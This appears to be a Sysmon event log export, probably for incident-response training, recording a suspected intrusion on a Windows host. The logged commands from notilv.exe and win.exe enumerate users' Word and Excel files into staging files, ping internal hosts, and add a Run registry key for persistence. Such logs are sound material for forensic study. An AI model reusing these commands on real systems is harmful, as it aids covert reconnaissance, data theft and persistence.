IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:55:18,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:18.931
ProcessGuid: {02EA0504-58D3-5A01-0000-00106D171100}
ProcessId: 2928
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:55:18,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:18.931
ProcessGuid: {02EA0504-58D3-5A01-0000-0010F5161100}
ProcessId: 2516
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:55:18,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:18.931
ProcessGuid: {02EA0504-58D3-5A01-0000-0010D3181100}
ProcessId: 2596
Image: C:\Windows\SysWOW64\PING.EXE"
情報,2019/11/07 15:55:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:15.795
ProcessGuid: {02EA0504-58D3-5A01-0000-0010D3181100}
ProcessId: 2596
Image: C:\Windows\SysWOW64\PING.EXE
CommandLine: ping  192.168.16.106
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=6AC7947207D999A65890AB25FE344955DA35028E
ParentProcessGuid: {02EA0504-58D3-5A01-0000-0010F5161100}
ParentProcessId: 2516
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""ping 192.168.16.106"""
情報,2019/11/07 15:55:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:15.764
ProcessGuid: {02EA0504-58D3-5A01-0000-00106D171100}
ProcessId: 2928
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-1942558625-917596623858629253839564231-130372652720633926451574616652-1441626815""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:55:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:15.764
ProcessGuid: {02EA0504-58D3-5A01-0000-0010F5161100}
ProcessId: 2516
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""ping 192.168.16.106""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:55:06,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:55:06.981
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\6K4KLU6DAU2LKIWDQ62P.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:55:06.981"
情報,2019/11/07 15:54:56,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:56.513
ProcessGuid: {02EA0504-58C0-5A01-0000-00106DF31000}
ProcessId: 2540
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:3806551 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:54:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:55.421
ProcessGuid: {02EA0504-58BB-5A01-0000-00107DF01000}
ProcessId: 2416
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:54:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:55.421
ProcessGuid: {02EA0504-58BB-5A01-0000-001005F01000}
ProcessId: 1392
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:54:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:55.421
ProcessGuid: {02EA0504-58BB-5A01-0000-0010CCF11000}
ProcessId: 2588
Image: C:\Windows\SysWOW64\PING.EXE"
情報,2019/11/07 15:54:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:51.740
ProcessGuid: {02EA0504-58BB-5A01-0000-0010CCF11000}
ProcessId: 2588
Image: C:\Windows\SysWOW64\PING.EXE
CommandLine: ping  192.168.16.105
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=6AC7947207D999A65890AB25FE344955DA35028E
ParentProcessGuid: {02EA0504-58BB-5A01-0000-001005F01000}
ParentProcessId: 1392
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""ping 192.168.16.105"""
情報,2019/11/07 15:54:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:51.677
ProcessGuid: {02EA0504-58BB-5A01-0000-00107DF01000}
ProcessId: 2416
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-1144168498-941462996-2037807440750362868-11043334011451319453-3928190920026613""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:54:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:51.677
ProcessGuid: {02EA0504-58BB-5A01-0000-001005F01000}
ProcessId: 1392
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""ping 192.168.16.105""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:54:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:30.633
ProcessGuid: {02EA0504-58A6-5A01-0000-001049EE1000}
ProcessId: 2536
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:54:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:30.633
ProcessGuid: {02EA0504-58A6-5A01-0000-0010D1ED1000}
ProcessId: 2748
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:54:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:30.602
ProcessGuid: {02EA0504-58A6-5A01-0000-001049EE1000}
ProcessId: 2536
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-18519926041994129145-1194573195936271337-722803919-1845459794-19059635692567645""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:54:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:30.602
ProcessGuid: {02EA0504-58A6-5A01-0000-0010D1ED1000}
ProcessId: 2748
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""type C:\Intel\Logs\gg.txt""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:54:23,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:23.082
ProcessGuid: {02EA0504-5760-5A01-0000-001083601000}
ProcessId: 1140
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:54:06,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:06.671
ProcessGuid: {02EA0504-588E-5A01-0000-00106FE01000}
ProcessId: 2192
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:54:06,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:06.671
ProcessGuid: {02EA0504-588E-5A01-0000-0010F7DF1000}
ProcessId: 480
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:54:06,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:06.515
ProcessGuid: {02EA0504-588E-5A01-0000-00106FE01000}
ProcessId: 2192
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""1222508824390516827-632258474521428278-294794050-937943227-1138282998180917337""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:54:06,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:06.515
ProcessGuid: {02EA0504-588E-5A01-0000-0010F7DF1000}
ProcessId: 480
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""dir C:\Users\*.xls* /s /o-d > C:\Intel\Logs\gg.txt""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:53:43,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:53:43.006
ProcessGuid: {02EA0504-5876-5A01-0000-0010E9D31000}
ProcessId: 2556
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:53:43,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:53:43.006
ProcessGuid: {02EA0504-5876-5A01-0000-001046D31000}
ProcessId: 2924
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:53:42,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:53:42.444
ProcessGuid: {02EA0504-5876-5A01-0000-0010E9D31000}
ProcessId: 2556
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""338926643-348954378-2113209370-681744015543502070-1801372689-218884517-1540709066""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:53:42,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:53:42.428
ProcessGuid: {02EA0504-5876-5A01-0000-001046D31000}
ProcessId: 2924
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""dir C:\Users\*.doc* /s /o-d > C:\Intel\Logs\g.txt""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:53:21,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:53:21.556
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\WHZA9MGAM34JD2AHY3NV.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:53:21.556"
情報,2019/11/07 15:53:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:53:04.099
ProcessGuid: {02EA0504-584D-5A01-0000-0010B0C31000}
ProcessId: 2784
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:53:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:53:04.099
ProcessGuid: {02EA0504-584D-5A01-0000-001002C31000}
ProcessId: 1864
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:53:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:53:04.099
ProcessGuid: {02EA0504-5850-5A01-0000-0010C1C41000}
ProcessId: 2560
Image: C:\Windows\SysWOW64\reg.exe"
情報,2019/11/07 15:53:04,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:53:04.068
ProcessGuid: {02EA0504-5850-5A01-0000-0010C1C41000}
ProcessId: 2560
Image: C:\Windows\SysWOW64\reg.exe
CommandLine: reg  add hkcu\software\microsoft\windows\currentversion\run /v netshare /f /d C:\Windows\TEMP\notilv.exe /t REG_EXPAND_SZ
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=8BD131B03D6BA865B228CA8EE3239D2EF2B90B74
ParentProcessGuid: {02EA0504-584D-5A01-0000-001002C31000}
ParentProcessId: 1864
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: c:\windows\system32\cmd.exe"
情報,2019/11/07 15:53:01,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:53:01.057
ProcessGuid: {02EA0504-584D-5A01-0000-0010B0C31000}
ProcessId: 2784
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-2036399158354886860-1593503607-815046145354632507-177372701212922806811580081715""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A1-5A01-0000-00105F7E0000}
ParentProcessId: 360
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:53:01,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:53:01.057
ProcessGuid: {02EA0504-584D-5A01-0000-001002C31000}
ProcessId: 1864
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: c:\windows\system32\cmd.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-584C-5A01-0000-0010E1C11000}
ParentProcessId: 2604
ParentImage: C:\Intel\Logs\win.exe
ParentCommandLine: C:\Intel\Logs\win.exe"
情報,2019/11/07 15:53:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:53:00.027
ProcessGuid: {02EA0504-584C-5A01-0000-0010E1C11000}
ProcessId: 2604
Image: C:\Intel\Logs\win.exe
CommandLine: C:\Intel\Logs\win.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=010B68C29483657117BFE0CFA420F45698ADF79B
ParentProcessGuid: {02EA0504-584C-5A01-0000-00109BC01000}
ParentProcessId: 1184
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.EXE /c C:\Intel\Logs\win.exe"
情報,2019/11/07 15:53:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:53:00.012
ProcessGuid: {02EA0504-584C-5A01-0000-0010ECC01000}
ProcessId: 2692
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-874435639-776687532710720717314658271999960630-59840998594105233-1088315477""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A1-5A01-0000-00105F7E0000}
ParentProcessId: 360
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:53:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:53:00.012
ProcessGuid: {02EA0504-584C-5A01-0000-00109BC01000}
ProcessId: 1184
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\Windows\system32\cmd.EXE /c C:\Intel\Logs\win.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8
ParentProcessGuid: {02EA0504-41EC-5A01-0000-0010C4BF0100}
ParentProcessId: 1928
ParentImage: C:\Windows\System32\taskeng.exe
ParentCommandLine: taskeng.exe {54713E6C-87C6-4368-99B5-3DB599A32F37} S-1-5-18:NT AUTHORITY\System:Service:"
情報,2019/11/07 15:52:39,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:52:39.342
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\INC8ITEQDQJ4FO8VB95H.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:52:39.342"
情報,2019/11/07 15:51:23,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:51:23.415
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\QDK6YTY7VLP368O8NDHU.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:51:23.415"
情報,2019/11/07 15:50:47,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:50:47.254
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\G8XPZYT1OLLWHSOXS3EC.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:50:47.254"
情報,2019/11/07 15:50:08,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:50:08.378
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\F20USXHICY9PSSN7VNFW.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:50:08.378"
情報,2019/11/07 15:49:15,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:49:15.078
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\MQJUH9L8SJ26TK2XTDBR.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:49:15.078"
情報,2019/11/07 15:49:08,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:49:08.978
ProcessGuid: {02EA0504-55FB-5A01-0000-0010ABDF0F00}
ProcessId: 1532
Image: C:\Windows\System32\svchost.exe"
